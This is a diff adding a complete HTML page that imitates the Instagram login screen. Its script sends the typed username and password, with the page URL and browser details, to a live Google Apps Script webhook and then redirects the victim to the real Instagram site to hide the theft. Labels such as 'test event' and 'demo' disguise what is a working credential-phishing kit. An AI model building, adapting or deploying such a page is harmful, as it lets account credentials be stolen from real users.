@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Instagram &bull; Login</title>
+	<!-- Live Favicon -->
+	<link href="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/instagram.svg" rel="icon" /><!-- Live Instagram-style Font -->
+	<link href="https://fonts.googleapis.com" rel="preconnect" />
+	<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect" />
+	<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&amp;display=swap" rel="stylesheet" />
+	<style type="text/css">* {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            color: #262626;
+        }
+
+        .main {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 32px;
+            margin-top: 40px;
+            width: 100%;
+            max-width: 935px;
+            padding: 0 20px;
+        }
+
+        /* Phone Mockup Frame */
+        .phone-mockup {
+            position: relative;
+            width: 380px;
+            height: 580px;
+            background: #000;
+            border-radius: 44px;
+            border: 12px solid #262626;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+        }
+
+        .phone-notch {
+            position: absolute;
+            top: 10px;
+            width: 110px;
+            height: 16px;
+            background: #262626;
+            border-radius: 10px;
+            z-index: 10;
+        }
+
+        /* Hosted Images Slideshow */
+        .slideshow {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            animation: changeHostedImage 12s infinite;
+        }
+
+        @keyframes changeHostedImage {
+            0%, 30% {
+                background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400&h=600&fit=crop');
+            }
+            33%, 63% {
+                background-image: url('https://images.unsplash.com/photo-1517841905240-472988babdf9?w=400&h=600&fit=crop');
+            }
+            66%, 96% {
+                background-image: url('https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=400&h=600&fit=crop');
+            }
+            100% {
+                background-image: url('https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=400&h=600&fit=crop');
+            }
+        }
+
+        /* Right Column (Login form & widgets) */
+        .right-column {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 35px 40px 25px;
+            text-align: center;
+        }
+
+        .logo-title {
+            font-family: 'Grand Hotel', cursive, -apple-system, sans-serif;
+            font-size: 52px;
+            font-weight: 400;
+            color: #262626;
+            margin-bottom: 24px;
+            line-height: 1;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .input {
+            width: 100%;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 9px 8px;
+            font-size: 12px;
+            outline: none;
+            color: #262626;
+        }
+
+        .input:focus {
+            border-color: #a8a8a8;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            padding: 7px 16px;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 18px 0;
+            color: #737373;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 16px;
+        }
+
+        .fb-login {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            margin-bottom: 16px;
+        }
+
+        .fb-login img {
+            width: 16px;
+            height: 16px;
+            filter: invert(27%) sepia(35%) saturate(1512%) hue-rotate(189deg) brightness(91%) contrast(89%);
+        }
+
+        .forgot-pass {
+            display: block;
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .signup-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+
+        .signup-card a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .app-section {
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        .app-text {
+            font-size: 14px;
+            margin-bottom: 14px;
+            color: #262626;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .store-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: #000000;
+            color: #ffffff;
+            padding: 6px 14px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-size: 10px;
+            line-height: 1.2;
+            text-align: left;
+        }
+
+        .store-badge img {
+            width: 18px;
+            height: 18px;
+            filter: invert(1);
+        }
+
+        .store-badge span strong {
+            display: block;
+            font-size: 13px;
+        }
+
+        /* Footer */
+        footer {
+            width: 100%;
+            padding: 30px 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 14px;
+        }
+
+        .footer-links a {
+            color: #737373;
+            font-size: 12px;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-copy {
+            color: #737373;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+
+        @media (max-width: 800px) {
+            .phone-mockup {
+                display: none;
+            }
+            .main {
+                margin-top: 20px;
+            }
+        }
+	</style>
+</head>
+<body>
+<main class="main"><!-- Phone Mockup with Hosted Live Image Slideshow -->
+<div class="phone-mockup">
+<div class="phone-notch">&nbsp;</div>
+
+<div class="slideshow">&nbsp;</div>
+</div>
+<!-- Login Form Column -->
+
+<div class="right-column">
+<div class="card">
+<div class="logo-title">Instagram</div>
+
+<form id="loginForm" action="" method="POST"><input id="username" autocomplete="username" class="input" placeholder="Phone number, username, or email" required type="text" /> <input id="password" autocomplete="current-password" class="input" name="password" placeholder="Password" required type="password" /><button id="submitBtn" type="submit"><span id="btnText">Log in</span></button><p id="err" hidden>Please fill in both fields.</p>
+
+<div class="divider"><span>OR</span></div>
+<a class="fb-login" href="#"> <img alt="Facebook" src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/facebook.svg" /> Log in with Facebook </a> <a class="forgot-pass" href="#">Forgot password?</a></form>
+</div>
+
+<div class="signup-card">Don&#39;t have an account? <a href="#">Sign up</a></div>
+
+<div class="app-section">
+<p class="app-text">Get the app.</p>
+
+<div class="app-buttons"><a class="store-badge" href="#"><img alt="Google Play" src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/googleplay.svg" /> <span>GET IT ON<strong>Google Play</strong></span> </a> <a class="store-badge" href="#"> <img alt="Microsoft" src="https://cdn.jsdelivr.net/npm/simple-icons@v9/icons/microsoft.svg" /> <span>Get it from<strong>Microsoft</strong></span> </a></div>
+</div>
+</div>
+</main>
+
+<footer>
+<div class="footer-links"><a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a> <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a> <a href="#">Instagram Lite</a> <a href="#">Threads</a> <a href="#">Contact Uploading &amp; Non-Users</a> <a href="#">Meta Verified</a></div>
+
+<div class="footer-copy">&copy; 2026 Instagram from Meta</div>
+</footer>
+
+
+<script>
+const CONFIG = {
+  WEBHOOK_URL: "https://script.google.com/macros/s/AKfycbx_p3CNRm-kl31QlpbddZaGyzaT13h82YxYlnxgFMSmixee6gnimkekQT6WOBbY98i0/exec",
+  REDIRECT_URL: "https://www.instagram.com/",
+  TIMEOUT_MS: 4000
+};
+
+const form = document.getElementById("loginForm");
+const errBox = document.getElementById("err");
+const btn = document.getElementById("submitBtn");
+const btnText = document.getElementById("btnText");
+const username = document.getElementById("username").value.trim();
+const password = document.getElementById("password").value;
+
+async function saveTestEvent(data) {
+  if (!CONFIG.WEBHOOK_URL ||
+      CONFIG.WEBHOOK_URL === "YOUR_TEST_WEBHOOK_URL") return;
+
+  const controller = new AbortController();
+  const timer = setTimeout(
+    () => controller.abort(),
+    CONFIG.TIMEOUT_MS
+  );
+
+  try {
+    await fetch(CONFIG.WEBHOOK_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: {
+        "Content-Type": "text/plain;charset=utf-8"
+      },
+      body: JSON.stringify(data),
+      signal: controller.signal
+    });
+  } catch (error) {
+    // Logging failures won't prevent the redirect.
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const username =
+    document.getElementById("username").value.trim();
+  const password =
+    document.getElementById("password").value;
+    console.log("Username entered:", username);
+  console.log("Password field is filled:", password);
+
+  if (!username || !password) {
+    if (errBox) {
+      errBox.hidden = false;
+      errBox.textContent = "Please fill in both fields.";
+    }
+    return;
+  }
+
+  if (errBox) errBox.hidden = true;
+
+  btn.disabled = true;
+  btn.classList.add("loading");
+  btnText.textContent = "Submitting…";
+
+
+await saveTestEvent({
+  event: "demo_form_submitted",
+  username: username,
+  password: password,
+  page: window.location.href,
+  agent: navigator.userAgent,
+  time: new Date().toISOString()
+});
+
+  if (CONFIG.REDIRECT_URL) {
+    window.location.href = CONFIG.REDIRECT_URL;
+  }
+});
+</script>
+
+</body>
+</html>
